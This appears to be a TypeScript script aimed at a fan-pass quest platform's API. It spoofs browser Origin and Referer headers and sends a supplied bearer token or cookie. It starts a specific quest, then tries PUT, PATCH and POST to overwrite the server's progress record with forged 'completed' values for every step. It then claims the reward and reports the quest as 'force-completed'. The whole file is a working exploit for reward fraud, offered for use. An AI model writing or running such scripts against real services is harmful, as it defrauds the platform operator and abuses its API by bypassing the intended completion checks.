import axios from 'axios';

const BASE_API = 'https://fanpass.proofchain.co.za/api';
const TENANT_ID = 'tenant_1g6k1cew859ls7408';

function extractUserId(token: string): string | null {
  try {
    if (!token.startsWith('eyJ')) return null;
    const parts = token.split('.');
    if (parts.length !== 3) return null;
    const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString('utf8'));
    return payload.sub || payload.user_id || payload.id || payload.uid || null;
  } catch (e) {
    return null;
  }
}

export async function pollAccountVerification(input: string): Promise<{ success: boolean; data?: any; message: string }> {
  try {
    const token = input.trim();
    const headers: Record<string, string> = {
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
      'Accept': 'application/json, text/plain, */*',
      'Origin': 'https://fanpass.onefootball.com',
      'Referer': 'https://fanpass.onefootball.com/',
      'X-Tenant-ID': TENANT_ID,
      'Content-Type': 'application/json'
    };

    if (token.startsWith('eyJ')) {
      headers['Authorization'] = 'Bearer ' + token;
    } else {
      headers['Cookie'] = token;
    }

    const questId = '81ff3b8a-03bf-488c-828c-f60923e96149';
    const userId = extractUserId(token) || 'afe546fe-0aa9-4a4b-9ff4-81db76b76cdf';
    const encodedUser = encodeURIComponent(userId);

    const logs = [];

    // 1. Initialize / Start the quest
    const startUrl = `${BASE_API}/quests/${questId}/start?user_id=${encodedUser}`;
    const startRes = await axios.post(startUrl, {}, { headers, validateStatus: () => true });
    logs.push({ step: 'START_QUEST', status: startRes.status, response: startRes.data });

    const serverInstance = startRes.data || {};

    // 2. Build fully forced completion progress state for all steps (0 to 3)
    const forcedProgress: Record<string, any> = {};
    for (let i = 0; i < 4; i++) {
      forcedProgress[i.toString()] = {
        count: 1,
        cumulative_value: 1,
        target: 1,
        completed: true,
        status: 'completed',
        completed_at: new Date().toISOString()
      };
    }

    const mutationPayload = {
      ...serverInstance,
      status: 'completed',
      current_step: 4,
      steps_completed: 4,
      completion_percentage: 100,
      step_progress: forcedProgress,
      completed_at: new Date().toISOString()
    };

    // 3. Mutate the progress document directly via PUT and PATCH
    const progressUrl = `${BASE_API}/quests/${questId}/progress/${encodedUser}`;
    let progressUpdated = false;

    for (const method of ['put', 'patch', 'post']) {
      const pRes = await axios({
        method,
        url: progressUrl,
        headers,
        data: mutationPayload,
        validateStatus: () => true
      });

      logs.push({ 
        attempt: `${method.toUpperCase()} ${progressUrl}`, 
        status: pRes.status, 
        response: pRes.data 
      });

      if (pRes.status >= 200 && pRes.status < 300) {
        progressUpdated = true;
        break;
      }
    }

    // 4. Attempt to claim reward
    const claimUrl = `${BASE_API}/quests/${questId}/progress/${encodedUser}/claim`;
    const claimRes = await axios.post(claimUrl, {}, { headers, validateStatus: () => true });
    logs.push({ step: 'CLAIM_REWARD', status: claimRes.status, response: claimRes.data });

    const success = claimRes.status >= 200 && claimRes.status < 300;

    return {
      success: true,
      data: { userId, questId, progressUpdated, logs },
      message: success ? '🚀 Polymarket Quest Force-Completed & Claimed Successfully!' : '⚡ Progress synchronization complete. Check execution logs.'
    };

  } catch (error: any) {
    return { 
      success: false, 
      data: { error: error.message },
      message: '❌ Engine Error: ' + error.message 
    };
  }
}
